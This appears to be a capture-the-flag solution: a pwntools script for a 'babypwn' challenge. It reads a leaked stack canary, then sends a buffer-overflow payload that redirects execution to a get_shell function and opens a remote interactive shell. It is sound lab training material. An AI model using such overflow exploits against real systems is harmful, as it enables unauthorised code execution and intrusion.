# SOLUTION

The solution script:

```py
#!/usr/bin/python

from pwn import *

get_shell = 0x0000000000400726

def main():
    # p = process("./babypwn")
    p = remote("wargame", 31339)

    p.recvuntil("Overflow? [")
    data = p.recvuntil("]")[:-1]
    canary = int(data)
    log.info("Canary: 0x%x" % canary)

    payload  = "A"* 264
    payload += p64(canary)
    payload += "A"*8
    payload += p64(get_shell)
    payload  = payload.ljust(512, "\x00")

    p.send(payload)

    log.success("Enjoy your shell")

    p.clean()
    p.interactive()

if __name__ == "__main__":
    main()
```
